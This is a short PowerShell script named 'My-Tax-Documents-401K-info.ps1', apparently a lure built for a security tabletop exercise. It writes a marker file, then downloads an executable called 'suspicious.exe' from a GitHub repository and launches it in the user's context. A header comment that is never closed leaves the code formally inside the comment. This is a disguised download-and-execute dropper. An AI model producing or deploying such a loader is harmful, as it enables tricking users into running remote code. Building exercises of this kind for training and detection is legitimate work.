<#
.SYNOPSIS
    My-Tax-Documents-401K-info.ps1

# 1) Write a marker so investigators see the script ran
$marker = Join-Path $env:USERPROFILE "Downloads\marker.txt"
"[+] My-Tax-Documents-401K-info.ps1 executed at $(Get-Date -Format o)" | Out-File -FilePath $marker -Append

# 2) Download the real loader EXE into Downloads
$loaderUrl  = "https://github.com/ttx-playground/TTX/blob/main/suspicious.exe"
$loaderPath = Join-Path $env:USERPROFILE "Downloads\suspicious.exe"
Invoke-WebRequest -Uri $loaderUrl -OutFile $loaderPath -UseBasicParsing

# 3) Execute the downloaded loader under the user context
Start-Process -FilePath $loaderPath
